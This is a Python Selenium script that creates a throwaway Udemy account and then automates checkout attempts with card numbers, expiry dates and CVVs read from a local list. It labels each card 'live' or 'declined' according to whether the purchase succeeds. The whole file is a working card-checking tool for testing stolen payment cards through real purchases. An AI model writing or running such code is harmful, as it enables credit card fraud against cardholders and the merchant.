from http import client
from typing import Text
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support import select
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import Select
import random
import string



from time import sleep

def funct():
    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split('|')
        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3]) ,)

    return kartlar


letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
def random_char(char_num):
       return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

user_agent = "Mozilla/5.1 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
profile = webdriver.FirefoxProfile() 
profile.set_preference("general.useragent.override", user_agent)
options = webdriver.FirefoxOptions()
options.headless = False
driver = webdriver.Firefox(profile, options=options)
wait = WebDriverWait(driver, 26, poll_frequency=1)
print('Starting ..')
driver.delete_all_cookies()
driver.get("https://www.udemy.com/join/signup-popup/?locale=en_US&response_type=html&next=https%3A%2F%2Fwww.udemy.com%2F")
wait.until(
     EC.presence_of_element_located((By.ID, 'id_fullname'))
).send_keys("nesbedrkjj")
wait.until(
     EC.presence_of_element_located((By.ID, 'email--1'))
).send_keys(random_char(7)+"@gmail.com")
wait.until(
     EC.presence_of_element_located((By.ID, 'password'))
).send_keys("1905fg1d5G")
driver.find_element_by_name("submit").click()
print('Register Finish ..')
driver.get("https://www.udemy.com/cart/checkout/express/course/1207960/?discountCode=CONVMT71221")


kartlar = funct()
for (cc, mm, yy, cvv) in kartlar:
    wait.until(
     EC.presence_of_element_located((By.ID, 'fullname'))
    ).clear()

    wait.until(
     EC.presence_of_element_located((By.ID, 'fullname'))
    ).send_keys("nergis kumbasar")

    wait.until(
     EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/div/input'))
    ).clear()
    sleep(0.5) 
    wait.until(
     EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/div/input'))
    ).send_keys(cc)    
    kart = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[2]/div/div/input')
    driver.find_element(By.CSS_SELECTOR, ".checkout--sc-card__expiry-month--38hv9 .form-control").click()
    aysec = driver.find_element(By.CSS_SELECTOR, ".checkout--sc-card__expiry-month--38hv9 .form-control")
    sleep(0.5)
    aysec.find_element(By.XPATH, "//option[. = '"+mm+"']").click()
    sleep(0.5)
    yilsec = driver.find_element(By.CSS_SELECTOR, ".checkout--sc-card__expiry-year--__q-v .form-control")
    yilsec.find_element(By.XPATH, "//option[. = '"+yy+"']").click()
    sleep(0.5)
    driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[3]/div[2]/div/input').clear()
    wait.until(
    EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div/div/div[2]/form/div[1]/div/div[3]/div/div[3]/div/div/div[2]/div/div[3]/div[2]/div/input'))
    ).send_keys(cvv) 
    driver.find_element(By.CSS_SELECTOR, '#udemy > div.main-content-wrapper > div.main-content > div > div > div > div.container.styles--shopping-container--A136v > form > div.styles--checkout-pane-outer--1syWc > div > div.styles--button-slider--2IGed.styles--checkout-slider--1ry4z > button').click()  
    sleep(3)
    hata1 = ("We couldn't complete this purchase. Please try again.")
    if 'Siparişiniz için çok teşekkür ederiz' in driver.page_source:
          print("LİVE KART NO"," :", cc,"|",mm,"|",yy,"|",cvv,)
    elif ("We couldn't complete this purchase. Please try again.") in driver.page_source: 
          print("DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)    



